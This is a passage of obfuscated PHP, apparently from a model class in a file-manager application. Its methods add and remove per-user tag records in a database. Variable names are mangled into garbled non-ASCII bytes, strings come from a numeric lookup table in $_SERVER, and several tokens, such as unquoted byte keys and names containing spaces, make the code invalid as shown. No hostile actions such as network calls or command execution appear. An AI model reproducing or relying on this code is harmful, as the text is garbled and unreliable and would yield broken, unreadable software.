addToTag($E±òíŠ—äé, $b©õµ´…ä¯) { $eÊÕÇ˜Ï‹ =& $_SERVER[¨¤¼…´]; if (!Model($eÊÕÇ˜Ï‹[2333])->listData($b©õµ´…ä¯) || !Model($eÊÕÇ˜Ï‹[742])->pathInfo($E±òíŠ—äé)) { return !1; } $aàòÍ‹‚„ï = array($eÊÕÇ˜Ï‹[1416] => USER_ID, $eÊÕÇ˜Ï‹[447] => $b©õµ´…ä¯, $eÊÕÇ˜Ï‹[399] => $E±òíŠ—äé, $eÊÕÇ˜Ï‹[400] => $eÊÕÇ˜Ï‹[394], $eÊÕÇ˜Ï‹[398] => $eÊÕÇ˜Ï‹[43], $eÊÕÇ˜Ï‹[2099] => 0); if ($this->where($aàòÍ‹‚„ï)->find()) { return !1; } return $this->add($aàòÍ‹‚„ï); } protected function removeFromTag($B¨ˆÙÆ†Ô, $Eêõ³¯é„Æ) { $c ‘ß×ï…¾ =& $_SERVER[¨¤¼…´]; if (!Model($c ‘ß×ï…¾[2333])->listData($Eêõ³¯é„Æ)) { return !1; } if (is_array($B¨ˆÙÆ†Ô)) { $B¨ˆÙÆ†Ô = array($c ‘ß×ï…¾[7], $B¨ˆÙÆ†Ô); } $féäÊÉå = array($c ‘ß×ï…¾[1416] => USER_ID, $c ‘ß×ï…¾[447] => $Eêõ³¯é„Æ, $c ‘ß×ï…¾[400] => $c ‘ß×ï…¾[394], $c ‘ß×ï…¾[399] => $B¨ˆÙÆ†Ô); return $this->where($féäÊÉå)->delete(); } protected function removeByTag($F¶ÂŸŞÒÅÚ) { $Dà´Ã—†»Æ =& $_SERVER[¨¤¼…´]; if (!$F¶ÂŸŞÒÅÚ) { return !1; } $eÍ…Õà–ù = array($Dà´Ã—†»Æ[1416] => USER_ID, $Dà´Ã—†»Æ[447] => $F¶ÂŸŞÒÅÚ); return $this->where($eÍ…Õà–ù)->delete(); } protected function removeBySource($b¾í²¶Äİ) { $AªÃÑí©ã¢ =& $_SERVER[¨¤¼…´]; if (is_array($b¾í²¶Äİ)) { $b¾í²¶Äİ = array($AªÃÑí©ã¢[7], $b¾í²¶Äİ); } $dò±õİ¹Ô“ = array($AªÃÑí©ã¢[1416] => USER_ID, $AªÃÑí©ã¢[399] => $b¾í²¶Äİ, $AªÃÑí©ã¢[447] => array($AªÃÑí©ã¢[914], 0)); return $this->where($dò±õİ¹Ô“)->delete(); } }